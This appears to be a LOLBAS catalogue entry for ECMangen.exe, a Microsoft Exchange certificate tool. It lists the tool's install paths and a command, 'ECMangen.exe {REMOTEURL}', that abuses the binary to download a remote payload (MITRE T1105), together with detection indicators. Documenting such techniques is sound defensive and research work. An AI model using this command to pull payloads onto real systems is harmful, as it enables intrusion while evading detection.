---
Acknowledgement:
- Person: Avihay El
Author: Avihay Eldad
Commands:
- Category: Download
  Command: ECMangen.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache
Created: 2024-04-30
Description: Command-line tool for managing certificates in Microsoft Exchange Server.
Detection:
- IOC: URL on a ECMangen command line
- IOC: ECMangen making unexpected network connections or DNS requests
Full_Path:
- Path: C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\ECMangen.exe
- Path: C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\x64\ECMangen.exe
- Path: C:\Program Files\Microsoft\Exchange Server\<version>\Bin\ECMangen.exe
- Path: C:\Program Files\Microsoft\Exchange Server\Bin\ECMangen.exe
- Path: C:\Program Files\Microsoft\Exchange Server\ClientAccess\Bin\ECMangen.exe
- Path: C:\ExchangeServer\Bin\ECMangen.exe
Name: ECMangen.exe
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/othermsbinaries
---

# ECMangen.exe

Command-line tool for managing certificates in Microsoft Exchange Server.

# Path(s)

- `C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\ECMangen.exe`
- `C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\Bin\x64\ECMangen.exe`
- `C:\Program Files\Microsoft\Exchange Server\<version>\Bin\ECMangen.exe`
- `C:\Program Files\Microsoft\Exchange Server\Bin\ECMangen.exe`
- `C:\Program Files\Microsoft\Exchange Server\ClientAccess\Bin\ECMangen.exe`
- `C:\ExchangeServer\Bin\ECMangen.exe`

# Download Commands

Downloads payload from remote server

```batch
ECMangen.exe {REMOTEURL}
```

- **Usecase:** It will download a remote payload and place it in INetCache
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows


# Acknowledgements

- Avihay Eldad (Authored, 2024-04-30)
- Avihay El